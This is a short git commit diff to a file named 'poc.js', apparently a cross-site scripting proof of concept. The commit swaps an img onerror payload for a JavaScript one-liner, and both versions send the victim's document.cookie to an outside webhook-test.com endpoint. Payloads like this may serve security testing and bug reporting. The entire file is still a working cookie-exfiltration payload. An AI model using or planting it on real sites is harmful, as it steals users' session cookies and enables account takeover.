cd24a2bd935b8676dd943d8dc7288e03b799835c
Chuu <36441023+uonghoangminhchau@users.noreply.github.com>
2025-10-01 13:43:27 +0700

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,2 @@
-<img src=x onerror=this.src='https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5/?'+document.cookie;>
+// poc.js
+new Image().src = 'https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5/?' + encodeURIComponent(document.cookie);
